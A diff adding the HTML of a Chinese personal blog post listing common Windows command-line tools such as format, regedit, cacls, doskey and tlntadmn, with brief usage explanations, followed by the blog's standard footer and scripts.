+<p>　　ver 在DOS窗口下显示版本信息</p>
+<p>　　winver 弹出一个窗口显示版本信息（内存大小、系统版本、补丁版本、计算机名）</p>
+<p>　　format 盘符 /FS:类型 格式化磁盘,类型:FAT、FAT32、NTFS ,例：Format D: /FS:NTFS</p>
+<p>　　md　目录名 创建目录</p>
+<p>　　replace 源文件　要替换文件的目录 替换文件</p>
+<p>　　ren 原文件名　新文件名 重命名文件名</p>
+<p>　　tree 以树形结构显示出目录，用参数-f 将列出第个文件夹中文件名称</p>
+<p>　　type 文件名 显示文本文件的内容</p>
+<p>　　more 文件名 逐屏显示输出文件</p>
+<p>　　doskey 要锁定的命令=字符</p>
+<p>　　doskey 要解锁命令= 为DOS提供的锁定命令(编辑命令行，重新调用win2k命令，并创建宏)。如：锁定dir命令：doskey dir=entsky (不能用doskey dir=dir)；解锁：doskey dir=</p>
+<p>　　taskmgr 调出任务管理器</p>
+<p>　　chkdsk /F D: 检查磁盘D并显示状态报告；加参数/f并修复磁盘上的错误</p>
+<p>　　tlntadmn telnt服务admn,键入tlntadmn选择3，再选择8,就可以更改telnet服务默认端口23为其它任何端口</p>
+<p>　　exit 退出cmd.exe程序或目前，用参数/B则是退出当前批处理脚本而不是cmd.exe</p>
+<p>　　path 路径可执行文件的文件名 为可执行文件设置一个路径。</p>
+<p>　　cmd 启动一个win2K命令解释窗口。参数：/eff、/en 关闭、开启命令扩展；更我详细说明见cmd /?</p>
+<p>　　regedit /s 注册表文件名 导入注册表；参数/S指安静模式导入，无任何提示；</p>
+<p>　　regedit /e 注册表文件名 导出注册表</p>
+<p>　　cacls 文件名　参数 显示或修改文件访问控制列表（ACL）——针对NTFS格式时。参数：/D 用户名:设定拒绝某用户访问；/P 用户名:perm 替换指定用户的访问权限；/G 用户名:perm 赋予指定用户访问权限；Perm 可以是: N 无，R 读取， W 写入， C 更改(写入)，F 完全控制；例：cacls D: est.txt /D pub 设定d: est.txt拒绝pub用户访问。</p>
+<p>　　cacls 文件名 查看文件的访问用户权限列表</p>
+<p>　　REM 文本内容 在批处理文件中添加注解</p>
+<p>　　netsh 查看或更改本地网络配置情况</p>
+
+        </div>
+        
+<blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2019-08-26T10:46:59.867Z" itemprop="dateUpdated">2019-08-26 18:46:59</time>
+</span><br>
+
+
+        
+        转载注明出处，原文地址：<a href="/2016/12/25/Windows常用命令/" target="_blank" rel="external">http://www.sivan.tech/2016/12/25/Windows常用命令/</a>
+        
+    </div>
+    <footer>
+        <a href="http://www.sivan.tech">
+            <img src="/img/1.jpg" alt="逸如风(yirufeng)">
+            逸如风(yirufeng)
+        </a>
+    </footer>
+</blockquote>
+
+        
+            <div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+            
+        
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CMD/">CMD</a></li></ul>
+
+            <div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.sivan.tech/2016/12/25/Windows常用命令/&title=《Windows常用命令》 — yirufeng's Blog&pic=http://www.sivan.tech/img/1.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.sivan.tech/2016/12/25/Windows常用命令/&title=《Windows常用命令》 — yirufeng's Blog&source=CMD命令：
+开始－&gt;运行－&gt;键入cmd或command（在命令行里可以看到系统版本、文件系统版本）
+
+
+appwiz.cpl：程序和功能
+c..." data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.sivan.tech/2016/12/25/Windows常用命令/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Windows常用命令》 — yirufeng's Blog&url=http://www.sivan.tech/2016/12/25/Windows常用命令/&via=http://www.sivan.tech" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.sivan.tech/2016/12/25/Windows常用命令/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+        </div>
+        
+            
+
+
+        
+    </div>
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="prev">
+      <a href="/2016/12/30/Java-7/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">[Java]-7</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="next">
+      <a href="/2016/12/25/Hexo常用命令/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Hexo常用命令</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+    
+    
+        <aside class="post-widget">
+            <nav class="post-toc-wrap" id="post-toc">
+                <strong>目录</strong>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#CMD命令："><span class="post-toc-number">1.</span> <span class="post-toc-text">CMD命令：</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#自动关机命令"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">自动关机命令</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#其他"><span class="post-toc-number">2.</span> <span class="post-toc-text">其他</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#基本的操作命令："><span class="post-toc-number">2.1.</span> <span class="post-toc-text">基本的操作命令：</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#磁盘操作"><span class="post-toc-number">2.1.1.</span> <span class="post-toc-text">磁盘操作</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#目录操作"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">目录操作</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#文件操作"><span class="post-toc-number">2.3.</span> <span class="post-toc-text">文件操作</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#内存操作"><span class="post-toc-number">2.4.</span> <span class="post-toc-text">内存操作</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#分区操作"><span class="post-toc-number">2.5.</span> <span class="post-toc-text">分区操作</span></a></li></ol></li></ol>
+            </nav>
+            <div class="toc-bar"><div>
+        </aside>
+    
+</article>
+
+    <div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        感谢原作，你的打赏是我的动力！
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/reward-wechat.jpg" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/reward-wechat.jpg" data-alipay="/img/reward-alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+    
+
+</div>
+
+    </main>
+    <footer class="footer ">
+    
+    <div class="top">
+        
+            <p>
+    <span>Links：</span>
+    
+    <span class="blogroll-item">
+        <a href="https://github.com/sivanWu0222" target="_blank">GitHub</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://weibo.com/Msingwen0222/home?wvr=5" target="_blank">新浪微博</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://www.linkedin.com/in/%E6%99%93%E6%96%87-%E5%90%B4-79057a121/" target="_blank">Linkedin</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://wpa.qq.com/msgrd?v=3&amp;uin=1666762170&amp;site=qq&amp;menu=yes" target="_blank">QQ</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://zh-cn.facebook.com/people/SiVan-Wu/100014408918389" target="_blank">Facebook</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&amp;email=xfTz8-Py8-f08vWFtLTrpqqo" target="_blank">Contact</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://twitter.com/SiVan_Wu" target="_blank">Twitter</a>
+    </span>
+    
+</p>
+
+        
+    </div>
+    
+    <div class="bottom">
+        <p>
+            <span>
+                逸如风(yirufeng) &copy; 2016 - 2019
+            </span>
+
+           	
+           	<span>
+           		<a href="http://beian.miit.gov.cn/" target="_blank">已实名认证</a>
+           	</span>
+           	
+
+            
+
+            
+
+            
+                
+<span class="site-uv" title="总访客量">
+    <i class="icon icon-user"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>
+
+
+<span class="site-pv" title="总访问量">
+    <i class="icon icon-eye"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
+</span>
+
+            
+        </p>
+    </div>
+</footer>
+
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.sivan.tech/2016/12/25/Windows常用命令/&title=《Windows常用命令》 — yirufeng's Blog&pic=http://www.sivan.tech/img/1.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.sivan.tech/2016/12/25/Windows常用命令/&title=《Windows常用命令》 — yirufeng's Blog&source=CMD命令：
+开始－&gt;运行－&gt;键入cmd或command（在命令行里可以看到系统版本、文件系统版本）
+
+
+appwiz.cpl：程序和功能
+c..." data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.sivan.tech/2016/12/25/Windows常用命令/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Windows常用命令》 — yirufeng's Blog&url=http://www.sivan.tech/2016/12/25/Windows常用命令/&via=http://www.sivan.tech" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.sivan.tech/2016/12/25/Windows常用命令/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACJUlEQVR42u3awU7lMAwFUP7/p5ktCwj3OmWkJierJ1TSnC4sx/bHR7w+v6zkmfXz67+v37K1MDAwXsv4XK6fnkmOnuww2/8bKgYGxgWMdVic/W7Xes9fzoyBgYFRBt91qtfugIGBgdEyklQvuW8mR8fAwMBoL7Hta/LrbvtfGBgYtzFmIfL//P6T/gYGBsarGDvlsDa9WwfZrSIdBgbG0Yw8wM2Oku/TBlwMDIw7Ge3ARPua/MqaD4phYGDcwMitM0xyoJ12JgYGxg2M9Z+SF+w0IJPPMSy9YWBgHMRIjtiC27p9u+cvPVgMDIxDGW1w3L/05gE6SkMxMDAuY+Tp2lOTHflg2Y9sDAyMoxn5qMSz4TJK+FokBgbGBYy8GZAPXsyaBG35DwMD42zGzvBo/rJZo7QI0BgYGEcz2p5gmzjODvrYgBoGBsZBjHr0anS5nY15FaMYGBgYRzP2i25J43MnHBfPY2BgHM14qkmQtAfaa21+JcbAwDiVkb+mHcXY36dITzEwMC5m5MHx2YGMNjRjYGDcw2iPOxvFKHLVOG3FwMA4lTEbsMivu3l6N2skRF8RAwPj5Yx85Yd+tpG5NTOCgYFxECMJsnlzsS3673yUOj/FwMB4OaMtzbcluTb1rD8WBgYGRnnEuqw/a1vuB1wMDIyjGUkyNzzQrPGAgYFxASMPnTsl/llxLRrCwMDAOJqRh7w2Ncz3zBsGW01NDAyM9zH+AV7cIuBwYM6kAAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+    
+    <!-- main-js -->
+<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
+<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.4.2"></script>
+<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.4.2"></script>
+<script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.js"></script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<script type="text/javascript" src="/js/method.js?v=1.4.2"></script>
+<script type="text/javascript" src="/js/blog.js?v=1.4.2"></script>
+
+<!-- third-party -->
+
+
+
+
+
+
+<script type="text/javascript" src="/js/plugins/local_search.js?v=1.4.2"></script>
+<script type="text/javascript">
+	var search_path = "search.xml";
+	if (search_path.length === 0) {
+		search_path = "search.xml";
+	}
+	var path = "/" + search_path;
+	searchFunc(path, "local-search-input", "local-search-result");
+</script>
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+    
+    
+
+
+
+<script type="text/javascript" src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+<script type="text/javascript" src="/js/plugins/leancloud_visitors.js?v=1.4.2"></script>
+
+
+
+    <!-- mathjax config similar to math.stackexchange -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+            processEscapes: true,
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+
+
+    <script>
+    (function() {
+        var OriginTitile = document.title, titleTime;
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden) {
+                document.title = '死鬼去哪里了！';
+                clearTimeout(titleTime);
+            } else {
+                document.title = '(つェ⊂)咦!又好了!';
+                titleTime = setTimeout(function() {
+                    document.title = OriginTitile;
+                },2000);
+            }
+        });
+    })();
+</script>
+
+
+
+
+
+    
+</body>
+</html>
